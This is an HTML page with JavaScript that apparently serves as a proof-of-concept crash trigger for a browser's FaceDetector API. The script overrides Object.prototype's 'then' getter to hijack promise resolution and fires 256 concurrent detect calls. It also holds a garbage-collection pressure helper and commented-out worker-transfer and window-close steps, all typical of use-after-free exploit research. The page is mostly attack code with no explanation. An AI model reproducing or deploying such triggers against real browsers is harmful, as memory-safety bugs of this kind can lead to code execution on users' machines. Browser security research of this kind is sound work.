<!DOCTYPE html>
<html>
<head>
</head>
<body>
  <button id="myBtn" style="height: 200px;width: 200px">Go</button>
  <button id="myBtn2" style="height: 200px;width: 200px">Bye</button>
  <pre id='log'></pre>  
  <script>
    function mylog(string) {
        var log = document.getElementById('log');
        if (log) {        
            log.innerText += string+'\n';
        }
    }

    function gc() {
      for(let i=0; i<10; i++) {
        new ArrayBuffer(10 * 1024 * 1024);
      }
    }

    async function detectTwice() {
      if (window.FaceDetector == undefined) {
        console.error(`Face Detection not supported`);
        return;
      }

      const faceDetector = new FaceDetector();
      const image = new ImageData(200, 100);

      Object.prototype.__defineGetter__("then", function() {
        mylog("Promise Resolver!");
        // setTimeout(()=> { arr[1] = new FaceDetector(); }, 3000);
      });

      await faceDetector.detect(image)
        .then(faces => { mylog("detect"); });

      // setTimeout(()=> window.close(), 100);

      //var blob = new Blob(['a'.repeat(0x100)], {type: 'text/plain'});
      //await faceDetector.detect(blob);

      for(let i=0; i<0x100; i++) {
        faceDetector.detect(image);
      }

      // mylog("worker!");
      // var worker = new Worker('worker.js');
      // worker.postMessage(faceDetector);
      // worker.terminate();
      // gc();
    }
    // detectTwice();

    // var blob = new Blob(['a'.repeat(0x100)], {type: 'image'});

    document.getElementById("myBtn").addEventListener("click", detectTwice);
    document.getElementById("myBtn2").addEventListener("click", bye);

    function bye() {
      Object.defineProperty(window, 'FaceDetector', {
        value: undefined
      });
    }

  </script>


  <a href="tel:+821011112222">mailto</a>
</body>
</html>


